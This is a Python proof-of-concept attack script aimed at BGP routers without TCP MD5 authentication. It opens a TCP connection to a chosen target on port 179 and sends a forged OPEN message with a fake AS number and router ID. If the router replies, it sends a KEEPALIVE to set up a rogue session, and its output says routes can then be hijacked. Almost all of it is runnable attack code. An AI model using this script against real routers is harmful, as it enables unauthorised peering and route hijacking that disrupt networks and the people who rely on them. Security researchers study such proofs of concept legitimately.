#!/usr/bin/env python3
"""
Proof-of-Concept: TCP MD5 Absence / Lack of Transport Authentication in BGP

This script demonstrates the vulnerability described in RFC 4271 where BGP relies
on TCP for transport but does not mandate authentication for the TCP connection itself.
If TCP MD5 (RFC 2385) is not configured on the target, an attacker can establish
a rogue BGP session by simply completing the TCP handshake and sending a BGP OPEN message.

Usage: python3 poc_tcp_md5_absence.py <TARGET_IP>
"""

import sys
import socket
import struct
import time

# BGP Constants
BGP_PORT = 179
BGP_VERSION = 4
BGP_HOLD_TIME = 90
BGP_BGP_ID = "1.1.1.1"  # Attacker's fake BGP Identifier
BGP_AS_NUMBER = 65535   # Attacker's fake AS Number

def craft_bgp_open_message():
    """
    Crafts a minimal BGP OPEN message according to RFC 4271 Section 4.2.
    
    Format:
    - Marker: 16 bytes of 0xFF (synchronization marker)
    - Length: 2 bytes (total length of message including header)
    - Type: 1 byte (1 = OPEN)
    - Version: 1 byte
    - My AS: 2 bytes
    - Hold Time: 2 bytes
    - BGP Identifier: 4 bytes
    - Optional Parameters Length: 1 byte (0 if none)
    """
    marker = b'\xff' * 16
    bgp_id_bytes = socket.inet_aton(BGP_BGP_ID)
    
    # Calculate total length: 16 (marker) + 2 (length) + 1 (type) + 1 (ver) + 2 (AS) + 2 (hold) + 4 (ID) + 1 (opt len)
    total_length = 16 + 2 + 1 + 1 + 2 + 2 + 4 + 1
    
    # Pack the OPEN message fields
    open_msg = struct.pack('!B H H 4s B', 
                           BGP_VERSION,      # Version
                           BGP_AS_NUMBER,    # My AS
                           BGP_HOLD_TIME,    # Hold Time
                           bgp_id_bytes,     # BGP Identifier
                           0                # Optional Parameters Length
    )
    
    # Construct full BGP message
    bgp_message = marker + struct.pack('!HB', total_length, 1) + open_msg
    return bgp_message

def parse_bgp_message(data):
    """
    Parses a received BGP message to determine its type and content.
    Returns a dictionary with message details.
    """
    if len(data) < 19: # Minimum BGP message size
        return {"error": "Message too short"}
    
    marker = data[:16]
    length = struct.unpack('!H', data[16:18])[0]
    msg_type = data[18]
    
    result = {
        "marker_valid": marker == (b'\xff' * 16),
        "length": length,
        "type": msg_type,
        "data": data[19:]
    }
    
    if msg_type == 1: # OPEN
        if len(data) >= 29:
            result["version"] = data[19]
            result["remote_as"] = struct.unpack('!H', data[20:22])[0]
            result["hold_time"] = struct.unpack('!H', data[22:24])[0]
            result["bgp_id"] = socket.inet_ntoa(data[24:28])
    elif msg_type == 2: # UPDATE
        result["type_name"] = "UPDATE"
    elif msg_type == 3: # NOTIFICATION
        if len(data) >= 21:
            result["error_code"] = data[19]
            result["error_subcode"] = data[20]
            result["type_name"] = "NOTIFICATION"
    elif msg_type == 4: # KEEPALIVE
        result["type_name"] = "KEEPALIVE"
    
    return result

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    print(f"[*] Target: {target_ip}:{BGP_PORT}")
    print(f"[*] Attempting to establish BGP session without TCP MD5...")
    
    try:
        # Step 1: Create TCP socket and connect
        # If TCP MD5 is enabled on the target, this connection will likely fail
        # or be reset because the attacker cannot provide the correct MD5 signature.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, BGP_PORT))
        print("[+] TCP connection established successfully.")
        
        # Step 2: Craft and send BGP OPEN message
        bgp_open = craft_bgp_open_message()
        sock.sendall(bgp_open)
        print("[+] BGP OPEN message sent.")
        
        # Step 3: Receive and parse response
        # A vulnerable target will respond with an OPEN or KEEPALIVE.
        # A patched target (with TCP MD5) would have rejected the TCP connection.
        data = sock.recv(4096)
        
        if not data:
            print("[-] Connection closed by target without response.")
            sock.close()
            return
            
        response = parse_bgp_message(data)
        
        if "error" in response:
            print(f"[-] Error parsing response: {response['error']}")
        else:
            print(f"[*] Received BGP message: Type={response.get('type', 'Unknown')}")
            
            if response.get('type') == 1: # OPEN
                print(f"    Remote AS: {response.get('remote_as')}")
                print(f"    Remote BGP ID: {response.get('bgp_id')}")
                print(f"    Remote Hold Time: {response.get('hold_time')}")
                print("[!] VULNERABLE: Target accepted BGP OPEN without TCP MD5 authentication.")
                print("    An attacker can now exchange UPDATE messages to hijack routes.")
                
                # Send KEEPALIVE to fully establish session
                keepalive = craft_bgp_keepalive()
                sock.sendall(keepalive)
                print("[+] BGP KEEPALIVE sent to establish session.")
                
            elif response.get('type') == 4: # KEEPALIVE
                print("[!] VULNERABLE: Target sent KEEPALIVE without TCP MD5 authentication.")
                print("    BGP session established successfully.")
                
            elif response.get('type') == 3: # NOTIFICATION
                print(f"    Error Code: {response.get('error_code')}")
                print(f"    Error Subcode: {response.get('error_subcode')}")
                print("[-] Target rejected BGP session (likely due to policy, not MD5).")
                
    except socket.timeout:
        print("[-] Connection timed out.")
    except ConnectionRefusedError:
        print("[-] Connection refused. Target may not be listening on port 179.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        if 'sock' in locals():
            sock.close()

def craft_bgp_keepalive():
    """
    Crafts a BGP KEEPALIVE message (Type 4).
    Format: Marker (16) + Length (2) + Type (1) = 19 bytes total.
    """
    marker = b'\xff' * 16
    length = 19
    msg_type = 4
    return marker + struct.pack('!HB', length, msg_type)

if __name__ == "__main__":
    main()
